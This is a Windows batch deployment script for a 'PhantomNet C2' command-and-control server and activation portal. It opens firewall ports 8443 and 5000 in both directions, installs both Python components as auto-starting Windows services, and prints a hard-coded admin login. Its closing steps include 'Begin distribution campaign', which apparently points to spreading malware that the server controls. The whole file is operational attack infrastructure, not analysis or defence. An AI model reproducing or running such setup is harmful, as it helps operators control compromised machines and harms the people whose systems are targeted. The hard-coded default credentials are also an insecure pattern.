@echo off
echo ========================================
echo PhantomNet C2 - VPS Deployment Script
echo ========================================
echo.

REM Check if running as Administrator
net session >nul 2>&1
if %errorLevel% == 0 (
    echo [✓] Running as Administrator
) else (
    echo [✗] This script must be run as Administrator
    pause
    exit /b 1
)

echo.
echo [1/8] Creating deployment directory...
if not exist "C:\PhantomNet" mkdir "C:\PhantomNet"
cd /d "C:\PhantomNet"

echo [2/8] Installing Python dependencies...
pip install flask flask-sqlalchemy flask-cors cryptography qrcode pillow werkzeug

echo [3/8] Configuring Windows Firewall...
netsh advfirewall firewall add rule name="PhantomNet C2" dir=in action=allow protocol=TCP localport=8443
netsh advfirewall firewall add rule name="PhantomNet Portal" dir=in action=allow protocol=TCP localport=5000
netsh advfirewall firewall add rule name="PhantomNet C2 Out" dir=out action=allow protocol=TCP localport=8443
netsh advfirewall firewall add rule name="PhantomNet Portal Out" dir=out action=allow protocol=TCP localport=5000

echo [4/8] Creating Windows Services...
nssm install PhantomNetC2 "C:\Python311\python.exe" "C:\PhantomNet\c2_server_flask.py"
nssm install PhantomNetPortal "C:\Python311\python.exe" "C:\PhantomNet\activation_portal.py"

echo [5/8] Setting service descriptions...
nssm set PhantomNetC2 Description "PhantomNet Command and Control Server"
nssm set PhantomNetPortal Description "PhantomNet Activation Portal"

echo [6/8] Configuring service startup...
nssm set PhantomNetC2 Start SERVICE_AUTO_START
nssm set PhantomNetPortal Start SERVICE_AUTO_START

echo [7/8] Starting services...
nssm start PhantomNetC2
nssm start PhantomNetPortal

echo [8/8] Deployment complete!
echo.
echo ========================================
echo DEPLOYMENT SUMMARY
echo ========================================
echo C2 Server: http://localhost:8443
echo Portal: http://localhost:5000
echo Admin Panel: http://localhost:5000/admin/login
echo Admin Credentials: admin / phantom_admin_2024
echo.
echo Services Status:
sc query PhantomNetC2 | find "STATE"
sc query PhantomNetPortal | find "STATE"
echo.
echo ========================================
echo NEXT STEPS:
echo 1. Configure domain and DNS
echo 2. Set up SSL certificates
echo 3. Configure reverse proxy
echo 4. Test all functionality
echo 5. Begin distribution campaign
echo ========================================
pause
